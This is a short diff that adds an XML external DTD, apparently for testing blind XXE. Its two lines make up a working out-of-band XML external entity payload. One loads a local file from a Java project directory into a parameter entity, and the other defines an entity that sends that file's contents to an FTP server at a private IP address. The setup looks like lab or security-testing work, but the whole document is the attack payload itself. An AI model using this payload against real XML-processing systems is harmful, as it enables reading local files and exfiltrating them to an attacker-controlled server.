@@ -1,0 +1,2 @@
+<!ENTITY % d SYSTEM "file:///C:\Users\Admin\IdeaProjects\Lohong2\src\main\java\com\example\lohong2\test.txt">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://192.168.10.128:2121/%d;'>">
